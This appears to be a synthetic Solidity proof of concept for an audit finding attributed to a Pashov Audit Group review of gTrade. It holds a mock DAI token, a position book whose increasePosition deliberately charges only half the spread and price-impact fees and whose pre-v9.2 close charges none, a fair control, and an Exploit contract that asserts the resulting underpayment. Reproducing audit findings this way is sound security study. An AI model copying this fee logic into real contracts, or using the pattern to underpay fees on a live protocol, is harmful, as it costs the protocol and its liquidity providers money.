// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  gTrade — increasePosition charges half the spread and half the price impact,
    then a pre-v9.2 close charges neither (Pashov Audit Group, H-01, July 2024).
    SYNTHETIC, cheatcode-free.
    Notional 100,000 DAI. Full spread 200 DAI (20 bps). Full impact 300 DAI (30 bps).
    The trader pays 250 DAI. The control charges both in full: 500 DAI. */

contract Dai {
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowance;

    function balanceOf(address account) external view returns (uint256) {
        return _balances[account];
    }

    function mint(address to, uint256 amount) external {
        _balances[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        _allowance[msg.sender][spender] = amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        _allowance[from][msg.sender] -= amount;
        _balances[from] -= amount;
        _balances[to] += amount;
        return true;
    }
}

contract PositionBook {
    uint256 internal constant BPS = 10_000;
    uint256 internal constant SPREAD_BPS = 20;
    uint256 internal constant IMPACT_BPS = 30;

    struct Trade {
        address user;
        uint32 index;
        bool long;
        uint16 pairIndex;
        uint256 maxLiqSpreadP;
    }

    Dai public dai;
    uint256 public feesCollected;

    constructor(Dai _dai) {
        dai = _dai;
    }

    function spreadFee(uint256 notional, bool halfSpread) public pure returns (uint256) {
        uint256 bps = halfSpread ? SPREAD_BPS / 2 : SPREAD_BPS;
        return notional * bps / BPS;
    }

    function impactFee(uint256 notional, bool halfImpact) public pure returns (uint256) {
        uint256 bps = halfImpact ? IMPACT_BPS / 2 : IMPACT_BPS;
        return notional * bps / BPS;
    }

    function getMarketExecutionPrice(uint256 price, uint256 spreadP, bool long, bool halfSpread) public pure returns (uint256) {
        uint256 used = halfSpread ? spreadP / 2 : spreadP;
        uint256 moved = price * used / BPS;
        return long ? price + moved : price - moved;
    }

    function increasePosition(Trade memory existingTrade, uint256 notional) external returns (uint256 fee) {
        uint256 market = getMarketExecutionPrice(10_000, SPREAD_BPS, existingTrade.long, true);
        uint256 oracle = 10_000;

        // @> VULN: the hardcoded true charges half the spread and half the impact for every trade, including pre-v9.2
        uint256 spreadCharged = notional * (market - oracle) / oracle;
        uint256 impactCharged = impactFee(notional, true);
        fee = spreadCharged + impactCharged;
        dai.transferFrom(msg.sender, address(this), fee);
        feesCollected += fee;
    }

    function increasePositionFull(Trade memory existingTrade, uint256 notional) external returns (uint256 fee) {
        uint256 market = getMarketExecutionPrice(10_000, SPREAD_BPS, existingTrade.long, false);
        uint256 oracle = 10_000;
        uint256 spreadCharged = notional * (market - oracle) / oracle;
        uint256 impactCharged = impactFee(notional, false);
        fee = spreadCharged + impactCharged;
        dai.transferFrom(msg.sender, address(this), fee);
        feesCollected += fee;
    }

    function getTradeClosingPriceImpact(Trade memory trade, uint256 marketPrice, uint256 notional)
        external
        pure
        returns (uint256 priceImpactP, uint256 priceAfterImpact, uint256 fee)
    {
        if (trade.maxLiqSpreadP == 0) {
            return (0, marketPrice, 0);
        }
        priceImpactP = IMPACT_BPS;
        priceAfterImpact = marketPrice;
        fee = notional * IMPACT_BPS / BPS;
    }
}

contract Exploit {
    uint256 public constant NOTIONAL = 100_000e18;
    uint256 public constant WRONG = 250e18;
    uint256 public constant FAIR = 500e18;

    Dai public dai; // nonce 1
    PositionBook public book; // nonce 2
    PositionBook public fairBook; // nonce 3

    uint256 public paidWrong;
    uint256 public closeFee;
    uint256 public paidFair;

    constructor() {
        dai = new Dai();
        book = new PositionBook(dai);
        fairBook = new PositionBook(dai);
    }

    function run() external {
        dai.mint(address(this), FAIR + WRONG);
        dai.approve(address(book), type(uint256).max);
        dai.approve(address(fairBook), type(uint256).max);

        PositionBook.Trade memory trade = PositionBook.Trade({
            user: msg.sender,
            index: 0,
            long: true,
            pairIndex: 0,
            maxLiqSpreadP: 0
        });

        paidWrong = book.increasePosition(trade, NOTIONAL);
        (,, closeFee) = book.getTradeClosingPriceImpact(trade, 10_000, NOTIONAL);
        paidFair = fairBook.increasePositionFull(trade, NOTIONAL);

        require(paidWrong == WRONG, "half charge");
        require(closeFee == 0, "close charged a pre-v9.2 trade");
        require(paidFair == FAIR, "control did not charge both");
        require(book.feesCollected() == WRONG, "protocol underpaid");
        require(fairBook.feesCollected() == FAIR, "control fees");
    }
}
